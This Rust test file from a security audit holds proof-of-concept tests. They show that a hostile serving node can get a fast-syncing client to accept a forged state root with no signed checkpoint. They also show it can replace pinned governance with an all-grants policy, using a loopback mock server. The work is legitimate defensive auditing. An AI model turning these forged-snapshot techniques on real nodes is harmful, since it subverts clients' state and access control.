//! Security audit 2026-11, WS8 — PoC for D26/D27: a hostile serving node hands
//! a fast-syncing client a forged state root and forged pinned policy versions.
//!
//! Loopback only: an in-process axum server plays the hostile serving node and
//! answers `/v1/sync-points` and `/v1/snapshot` with a snapshot the attacker
//! built. No production host, no Avail, fake keys. `#[ignore]`d; run with
//! `cargo test -p sbo-daemon --test audit_2026_11_poc_fastsync -- --ignored`.
//! Backs `docs/security-audit-2026-11-ws8-pocs.md`.

use sbo_core::crypto::ContentHash;
use sbo_core::message::{Id, Path};
use sbo_core::policy::Policy;
use sbo_core::state::{StateDb, StoredObject};
use sbo_daemon::bootstrap::{evaluate_trust, RootTrust, TrustPolicy};
use sbo_daemon::snapshot::{compute_snapshot_root, SnapshotMeta, SnapshotPayload};
use tempfile::tempdir;

fn obj(path: &str, id: &str, hash: u8, schema: Option<&str>, payload: &[u8]) -> StoredObject {
    StoredObject {
        path: Path::parse(path).unwrap(),
        id: Id::new(id).unwrap(),
        creator: Id::new("sys").unwrap(),
        owner: Id::new("sys").unwrap(),
        content_type: "application/json".into(),
        content_hash: ContentHash::sha256(payload),
        payload: payload.to_vec(),
        policy_ref: None,
        related: None,
        content_schema: schema.map(|s| s.to_string()),
        owner_ref: None,
        block_number: 100,
        object_hash: [hash; 32],
        hlc: None,
        prev: None,
    }
}

/// D26: under the DEFAULT trust policy `{[sys-checkpointer], 1}`, a root the
/// serving node simply asserts counts as backed by the authority with no signed
/// `checkpoint.v1` ever read. `evaluate_trust` returns `Some(1)` for a root the
/// attacker invented at an arbitrary height.
#[test]
#[ignore] // AUDIT-2026-11 D26 PoC: the authority "backs" any root with no signature
fn poc_d26_authority_backs_a_forged_root_with_no_checkpoint() {
    let forged_root = "de".repeat(32);
    let backers = evaluate_trust(&TrustPolicy::default(), 999_999, &forged_root, &[]);
    assert_eq!(
        backers,
        Some(1),
        "PoC FAILED TO REPRODUCE — the authority did not back the forged root",
    );
}

/// D27: a fast-sync client loads `policy_versions` from the snapshot payload
/// without checking that each key is the policy's own content hash. A hostile
/// node files an all-grants policy under the hash a child community pinned, so
/// the client's frozen governance is silently rewritten.
///
/// We build a snapshot whose OBJECT set reconstructs a root (so the root check
/// passes), then attach a forged `(hash, all-grants-policy)` version whose key
/// is NOT that policy's content hash, and load it with `verify_and_load_payload`.
#[test]
#[ignore] // AUDIT-2026-11 D27 PoC: forged pinned policy versions load unverified
fn poc_d27_forged_policy_version_loads_into_a_fast_sync_client() {
    // The honest object set and its true root.
    let objects = vec![
        obj("/communities/cooks/", "community", 7, Some("x.v1"), b"{}"),
        obj("/communities/cooks/", "root", 8, Some("policy.v2"),
            br#"{"grants":[{"to":"owner","can":["update"],"on":"/communities/cooks/**"}]}"#),
    ];
    let root = compute_snapshot_root(&objects);

    // The attacker's forged pinned version: an all-grants policy filed under a
    // hash the victim's child policy pins (here just a label the client trusts).
    let forged: Policy = serde_json::from_value(serde_json::json!({
        "grants": [{"to": "*", "can": ["*"], "on": "/**"}]
    }))
    .unwrap();
    let pinned_hash = "sha256:00000000000000000000000000000000000000000000000000000000deadbeef";
    let payload = SnapshotPayload {
        objects,
        policy_versions: vec![(pinned_hash.to_string(), forged.clone())],
    };

    let dst = tempdir().unwrap();
    let db = StateDb::open(dst.path()).unwrap();
    let res = sbo_daemon::bootstrap::verify_and_load_payload(&db, &payload, root);

    // Today: the snapshot root matches (objects are honest), so the load
    // succeeds AND the forged version is stored under the pinned hash.
    assert!(res.is_ok(), "snapshot root check unexpectedly failed: {res:?}");
    let loaded = db.get_policy_version(pinned_hash).unwrap();
    let loaded_json = loaded.map(|p| serde_json::to_string(&p).unwrap());
    let forged_json = serde_json::to_string(&forged).unwrap();
    assert_eq!(
        loaded_json.as_deref(),
        Some(forged_json.as_str()),
        "PoC FAILED TO REPRODUCE — the forged policy version did not load",
    );
}

/// D26 end-to-end shape: a hostile in-process node serves a manifest whose
/// snapshot reconstructs the root it advertises, and the default policy adopts
/// it as `OnChainCheckpoint` with no on-chain checkpoint object in sight. Proves
/// the serving node alone determines what a defaulted client trusts.
#[tokio::test]
#[ignore] // AUDIT-2026-11 D26 PoC: a hostile node's root is adopted end to end
async fn poc_d26_hostile_node_root_adopted_end_to_end() {
    use axum::routing::get;

    let objects = vec![obj("/x/", "a", 1, None, b"{}")];
    let root_hex = hex::encode(compute_snapshot_root(&objects));
    let payload = SnapshotPayload { objects, policy_versions: vec![] };

    // gzip the payload as the real snapshot endpoint does.
    let gz = {
        use std::io::Write;
        let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        e.write_all(&serde_json::to_vec(&payload).unwrap()).unwrap();
        e.finish().unwrap()
    };

    let manifest = sbo_daemon::http::SyncPointsView {
        format: "sbo-syncpoints/1".into(),
        genesis: sbo_daemon::http::GenesisView { first_block: Some(1), genesis_hash: None },
        head: 100,
        latest_state_root: sbo_daemon::http::StateRootView { block: 100, state_root: root_hex.clone() },
        snapshots: vec![SnapshotMeta {
            format: "sbo-snapshot/2".into(),
            block: 100,
            state_root: root_hex.clone(),
            object_count: 1,
            created_at: 0,
            uncompressed_bytes: 0,
            compressed_bytes: gz.len() as u64,
            content_sha256: hex::encode(sbo_core::sha256(&gz)),
            file: "snapshot-100.json.gz".into(),
        }],
        // No on-chain checkpoint object at all — the node just asserts the root.
        checkpoints: vec![],
        attestations: vec![],
    };

    let manifest_json = serde_json::to_string(&manifest).unwrap();
    let app = axum::Router::new()
        .route("/v1/sync-points", get(move || {
            let m = manifest_json.clone();
            async move { ([("content-type", "application/json")], m) }
        }))
        .route("/v1/snapshot", get(move || {
            let b = gz.clone();
            async move { b }
        }));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

    let dst = tempdir().unwrap();
    let db = StateDb::open(dst.path()).unwrap();
    let res = sbo_daemon::bootstrap::bootstrap(&db, &format!("http://{addr}")).await;

    let out = res.expect("PoC FAILED TO REPRODUCE — bootstrap from the hostile node errored");
    assert_eq!(out.block, 100);
    // The client adopted the node's asserted root, loading its objects, with the
    // authority counted as the lone backer (RootTrust::OnChainCheckpoint) or the
    // serving-node fallback — either way the serving node chose the state.
    assert!(
        matches!(out.trust, RootTrust::OnChainCheckpoint | RootTrust::ServingNode),
        "unexpected trust basis {:?}",
        out.trust,
    );
    assert_eq!(db.list_objects_by_path_prefix("/").unwrap().len(), 1);
}
